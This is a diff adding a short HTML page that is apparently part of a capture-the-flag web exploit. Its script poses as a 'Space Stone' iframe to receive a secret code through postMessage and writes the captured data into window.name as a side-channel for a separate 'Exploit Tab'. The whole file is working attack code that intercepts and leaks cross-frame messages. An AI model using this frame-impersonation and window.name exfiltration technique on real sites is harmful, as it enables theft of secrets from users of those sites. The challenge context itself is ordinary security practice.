@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // This page replaces the Space Stone.
+        // The Parent will send the secret code to us thinking we are the Space Stone.
+        window.addEventListener('message', (e) => {
+            // Send the stolen data to the Exploit Tab (Protocol v5)
+            // We use 'window.opener' if opened, or 'top.opener'
+            if(e.data) {
+                // Determine where to send it. 
+                // If we are in the iframe, our 'top' is the Challenge. 
+                // We need to talk to the Exploit Tab.
+                // Since we can't easily reach the Exploit Tab from here,
+                // we will use the 'window.name' side-channel.
+                window.name = "SPACE_CAPTURED:" + e.data;
+            }
+        });
+    </script>
+</body>
+</html>
